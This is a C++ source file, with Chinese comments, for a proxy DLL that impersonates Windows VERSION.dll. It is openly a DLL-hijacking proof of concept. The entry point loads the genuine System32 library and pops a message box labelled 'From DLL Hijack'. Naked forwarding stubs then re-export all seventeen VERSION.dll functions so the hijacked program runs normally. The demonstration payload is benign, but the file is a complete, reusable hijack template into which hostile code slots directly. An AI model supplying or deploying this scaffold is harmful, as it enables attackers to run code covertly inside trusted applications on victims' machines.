// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		// 绝对路径加载VERSION.dll
		::LoadLibrary("C:\\Windows\\System32\\VERSION.dll");

		::MessageBox(NULL, "调用函数方法", "From DLL Hijack", MB_OK | MB_ICONWARNING);
		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		// 卸载VERSION.dll
		HMODULE hDll = ::GetModuleHandle("C:\\Windows\\System32\\VERSION.dll");
		if (hDll)
		{
			::FreeLibrary(hDll);
		}
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		break;
	}
		break;
	}
	return TRUE;
}


// 导出
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=_DG_GetFileVersionInfoA,@1")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoByHandle=_DG_GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExA=_DG_GetFileVersionInfoExA,@3")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExW=_DG_GetFileVersionInfoExW,@4")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=_DG_GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExA=_DG_GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExW=_DG_GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeW=_DG_GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=_DG_GetFileVersionInfoW,@9")
#pragma comment(linker, "/EXPORT:VerFindFileA=_DG_VerFindFileA,@10")
#pragma comment(linker, "/EXPORT:VerFindFileW=_DG_VerFindFileW,@11")
#pragma comment(linker, "/EXPORT:VerInstallFileA=_DG_VerInstallFileA,@12")
#pragma comment(linker, "/EXPORT:VerInstallFileW=_DG_VerInstallFileW,@13")
#pragma comment(linker, "/EXPORT:VerLanguageNameA=_DG_VerLanguageNameA,@14")
#pragma comment(linker, "/EXPORT:VerLanguageNameW=_DG_VerLanguageNameW,@15")
#pragma comment(linker, "/EXPORT:VerQueryValueA=_DG_VerQueryValueA,@16")
#pragma comment(linker, "/EXPORT:VerQueryValueW=_DG_VerQueryValueW,@17")


// 获取函数地址
PVOID GetFunctionAddress(const char *pszFunctionName)
{
	PVOID pAddr = NULL;
	HMODULE hDll = NULL;
	char szDllPath[MAX_PATH] = "C:\\Windows\\System32\\VERSION.dll";

	hDll = ::LoadLibrary(szDllPath);
	if (NULL == hDll)
	{
		return NULL;
	}
	pAddr = ::GetProcAddress(hDll, pszFunctionName);
	::FreeLibrary(hDll);

	return pAddr;
}



// 函数
extern "C" void __declspec(naked) DG_GetFileVersionInfoA()
{
	GetFunctionAddress("GetFileVersionInfoA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoByHandle()
{
	GetFunctionAddress("GetFileVersionInfoByHandle");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoExA()
{
	GetFunctionAddress("GetFileVersionInfoExA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoExW()
{
	GetFunctionAddress("GetFileVersionInfoExW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoSizeA()
{
	GetFunctionAddress("GetFileVersionInfoSizeA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoSizeExA()
{
	GetFunctionAddress("GetFileVersionInfoSizeExA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoSizeExW()
{
	GetFunctionAddress("GetFileVersionInfoSizeExW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoSizeW()
{
	GetFunctionAddress("GetFileVersionInfoSizeW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_GetFileVersionInfoW()
{
	GetFunctionAddress("GetFileVersionInfoW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerFindFileA()
{
	GetFunctionAddress("VerFindFileA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerFindFileW()
{
	GetFunctionAddress("VerFindFileW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerInstallFileA()
{
	GetFunctionAddress("VerInstallFileA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerInstallFileW()
{
	GetFunctionAddress("VerInstallFileW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerLanguageNameA()
{
	GetFunctionAddress("VerLanguageNameA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerLanguageNameW()
{
	GetFunctionAddress("VerLanguageNameW");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerQueryValueA()
{
	GetFunctionAddress("VerQueryValueA");
	__asm jmp eax
}

extern "C" void __declspec(naked) DG_VerQueryValueW()
{
	GetFunctionAddress("VerQueryValueW");
	__asm jmp eax
}
